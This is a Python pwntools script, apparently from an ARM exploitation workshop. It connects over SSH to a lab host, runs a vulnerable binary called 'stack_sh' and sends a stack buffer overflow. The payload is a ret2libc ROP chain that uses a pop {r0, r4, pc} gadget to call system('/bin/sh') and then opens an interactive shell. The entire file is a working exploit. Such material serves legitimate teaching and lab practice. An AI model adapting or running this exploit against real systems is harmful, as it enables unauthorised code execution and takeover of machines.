#!/usr/bin/env python2

from pwn import *

ip = "192.168.1.100"
port = 22
user = "user1"
pwd = "pass1"

libc = ELF('/home/arm/Workshop/exploits/gadgets/libc-2.24.so')

gadget_offset = 0x0007753c
libc_base = 0x76e65000

gadget_address = libc_base + gadget_offset
system_address = libc_base + libc.symbols['system']
shell_address = libc_base + next(libc.search("/bin/sh"))

shell = ssh(user, ip, password=pwd, port=port)

sh = shell.run('/home/user1/Workshop/exploits/stack_sh/stack_sh')

payload = "A"*20
payload += p32(gadget_address)       # gadget address - pop {r0, r4, pc}
payload += p32(shell_address)        # r0 - address of /bin/sh
payload += p32(0x42424242)           # r4 - not important
payload += p32(system_address)       # pc - system address
sh.sendline(payload)

sh.interactive()

shell.close()
